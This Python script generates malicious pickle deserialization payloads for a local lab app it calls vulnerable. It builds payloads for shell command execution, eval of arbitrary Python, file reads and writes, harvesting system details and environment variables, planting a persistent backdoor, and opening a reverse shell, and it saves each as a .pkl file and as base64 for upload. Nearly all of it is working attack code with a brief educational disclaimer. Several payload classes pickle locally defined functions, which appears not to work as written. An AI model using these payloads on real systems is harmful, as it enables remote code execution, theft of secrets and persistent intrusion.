#!/usr/bin/env python3
"""
Malicious Pickle Payload Generator
This script demonstrates various types of attacks that can be performed
through pickle deserialization vulnerabilities.

WARNING: These payloads are for educational purposes only.
Only use against systems you own or have explicit permission to test.
"""

import pickle
import base64
import os
import subprocess
import sys
from pathlib import Path


class PayloadBase:
    """Base class for all attack payloads"""

    def __init__(self, description=""):
        self.description = description

    def generate_pickle(self):
        """Generate the pickled payload"""
        return pickle.dumps(self)

    def generate_base64(self):
        """Generate base64 encoded pickle payload"""
        return base64.b64encode(self.generate_pickle()).decode("utf-8")

    def save_to_file(self, filename):
        """Save payload to a file"""
        with open(filename, "wb") as f:
            f.write(self.generate_pickle())
        print(f"💾 Payload saved to: {filename}")


class CommandExecutionPayload(PayloadBase):
    """Executes system commands using os.system()"""

    def __init__(self, command, description="Command execution payload"):
        super().__init__(description)
        self.command = command

    def __reduce__(self):
        return (os.system, (self.command,))


class SubprocessPayload(PayloadBase):
    """Executes commands using subprocess.call()"""

    def __init__(self, command, description="Subprocess execution payload"):
        super().__init__(description)
        self.command = command

    def __reduce__(self):
        return (subprocess.call, (self.command,))


class FileWritePayload(PayloadBase):
    """Writes content to a file"""

    def __init__(self, filename, content, description="File write payload"):
        super().__init__(description)
        self.filename = filename
        self.content = content

    def __reduce__(self):
        def write_file(filename, content):
            with open(filename, "w") as f:
                f.write(content)
            return f"File written: {filename}"

        return (write_file, (self.filename, self.content))


class FileReadPayload(PayloadBase):
    """Reads content from a file"""

    def __init__(self, filename, description="File read payload"):
        super().__init__(description)
        self.filename = filename

    def __reduce__(self):
        def read_file(filename):
            try:
                with open(filename, "r") as f:
                    content = f.read()
                print(f"📄 File content ({filename}):")
                print(content)
                return content
            except Exception as e:
                print(f"❌ Error reading file {filename}: {e}")
                return None

        return (read_file, (self.filename,))


class ReverseShellPayload(PayloadBase):
    """Creates a reverse shell connection"""

    def __init__(
        self, host="127.0.0.1", port=4444, description="Reverse shell payload"
    ):
        super().__init__(description)
        self.host = host
        self.port = port

    def __reduce__(self):
        def reverse_shell(host, port):
            import socket
            import subprocess
            import threading

            def shell_handler():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, port))

                    while True:
                        command = s.recv(1024).decode("utf-8")
                        if command.lower() == "exit":
                            break

                        try:
                            output = subprocess.check_output(
                                command, shell=True, stderr=subprocess.STDOUT
                            )
                            s.send(output)
                        except Exception as e:
                            s.send(f"Error: {str(e)}\n".encode("utf-8"))

                    s.close()
                except Exception as e:
                    print(f"Reverse shell error: {e}")

            # Run in background thread to avoid blocking
            thread = threading.Thread(target=shell_handler)
            thread.daemon = True
            thread.start()

            return f"Reverse shell initiated to {host}:{port}"

        return (reverse_shell, (self.host, self.port))


class InformationGatheringPayload(PayloadBase):
    """Gathers system information"""

    def __init__(self, description="Information gathering payload"):
        super().__init__(description)

    def __reduce__(self):
        def gather_info():
            import platform
            import getpass
            import socket

            info = {
                "System": platform.system(),
                "Node": platform.node(),
                "Release": platform.release(),
                "Version": platform.version(),
                "Machine": platform.machine(),
                "Processor": platform.processor(),
                "Username": getpass.getuser(),
                "Hostname": socket.gethostname(),
                "Current Directory": os.getcwd(),
                "Python Version": sys.version,
                "Environment Variables": dict(os.environ),
            }

            print("🔍 SYSTEM INFORMATION GATHERED:")
            print("=" * 50)
            for key, value in info.items():
                if key != "Environment Variables":
                    print(f"{key}: {value}")

            print("\n📂 Current Directory Contents:")
            try:
                for item in os.listdir("."):
                    print(f"  - {item}")
            except:
                print("  Unable to list directory contents")

            return info

        return (gather_info, ())


class PersistentPayload(PayloadBase):
    """Creates a persistent backdoor"""

    def __init__(
        self,
        script_content,
        filename="backdoor.py",
        description="Persistent backdoor payload",
    ):
        super().__init__(description)
        self.script_content = script_content
        self.filename = filename

    def __reduce__(self):
        def create_backdoor(content, filename):
            try:
                with open(filename, "w") as f:
                    f.write(content)

                # Make executable on Unix systems
                if os.name != "nt":
                    os.chmod(filename, 0o755)

                print(f"🚪 Backdoor created: {filename}")
                return f"Backdoor installed: {filename}"
            except Exception as e:
                print(f"❌ Backdoor creation failed: {e}")
                return None

        return (create_backdoor, (self.script_content, self.filename))


class EvalPayload(PayloadBase):
    """Executes arbitrary Python code using eval()"""

    def __init__(self, python_code, description="Python code execution payload"):
        super().__init__(description)
        self.python_code = python_code

    def __reduce__(self):
        return (eval, (self.python_code,))


def demonstrate_payloads():
    """Demonstrate various attack payloads"""

    print("🥒 PICKLE ATTACK PAYLOAD GENERATOR")
    print("=" * 60)
    print("⚠️  WARNING: Educational purposes only!")
    print("   Only use on systems you own or have permission to test.")
    print("=" * 60)

    # Create output directory
    output_dir = Path("payloads")
    output_dir.mkdir(exist_ok=True)

    payloads = []

    # 1. Basic command execution
    cmd_payload = CommandExecutionPayload(
        "echo 'Hello from pickle attack!' > /tmp/pickle_attack.txt",
        "Basic command execution - creates a file",
    )
    payloads.append(("command_execution", cmd_payload))

    # 2. Information gathering
    info_payload = InformationGatheringPayload()
    payloads.append(("info_gathering", info_payload))

    # 3. File operations
    file_write_payload = FileWritePayload(
        "/tmp/malicious_file.txt",
        "This file was created by a malicious pickle!\nTimestamp: "
        + str(os.time.time() if hasattr(os, "time") else "unknown"),
        "File write operation",
    )
    payloads.append(("file_write", file_write_payload))

    # 4. Python code execution
    eval_payload = EvalPayload(
        "print('🐍 Python code executed via pickle!'); __import__('os').system('whoami')",
        "Direct Python code execution",
    )
    payloads.append(("python_eval", eval_payload))

    # 5. Persistent backdoor (harmless example)
    backdoor_content = """#!/usr/bin/env python3
# Harmless backdoor example for demonstration
import os
import time

print("🚪 Backdoor activated at", time.ctime())
print("Current user:", os.environ.get('USER', 'unknown'))
print("Current directory:", os.getcwd())
"""

    persistent_payload = PersistentPayload(
        backdoor_content, "/tmp/demo_backdoor.py", "Creates a persistent backdoor file"
    )
    payloads.append(("persistent_backdoor", persistent_payload))

    # 6. Reverse shell (localhost only for safety)
    reverse_shell_payload = ReverseShellPayload(
        "127.0.0.1", 4444, "Reverse shell to localhost:4444"
    )
    payloads.append(("reverse_shell", reverse_shell_payload))

    # Generate all payloads
    print("\n📦 GENERATING PAYLOADS:")
    print("-" * 40)

    for name, payload in payloads:
        print(f"\n🎯 {payload.description}")

        # Save to file
        filename = output_dir / f"{name}.pkl"
        payload.save_to_file(filename)

        # Generate base64 for web interface
        b64_payload = payload.generate_base64()
        b64_filename = output_dir / f"{name}_base64.txt"
        with open(b64_filename, "w") as f:
            f.write(b64_payload)

        print(f"📄 Base64 payload saved to: {b64_filename}")
        print(f"📏 Base64 length: {len(b64_payload)} characters")

        # Show first 100 characters of base64
        print(f"🔍 Preview: {b64_payload[:100]}...")

    print(f"\n✅ All payloads generated in '{output_dir}' directory")
    print("\n📋 USAGE INSTRUCTIONS:")
    print("1. Start the vulnerable app: python vulnerable_app.py")
    print("2. Visit http://127.0.0.1:5000/")
    print("3. Upload .pkl files or paste base64 content")
    print("4. Observe the attack execution in the terminal")

    print("\n🔒 DEFENSE REMINDERS:")
    print("- Never unpickle untrusted data")
    print("- Use JSON or MessagePack for untrusted sources")
    print("- Implement HMAC signatures for data integrity")
    print("- Run applications with minimal privileges")


def create_simple_payload():
    """Create a simple payload for quick testing"""
    payload = CommandExecutionPayload("echo 'Pickle attack successful!'")
    return payload.generate_base64()


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--simple":
        print("Simple payload (base64):")
        print(create_simple_payload())
    else:
        demonstrate_payloads()
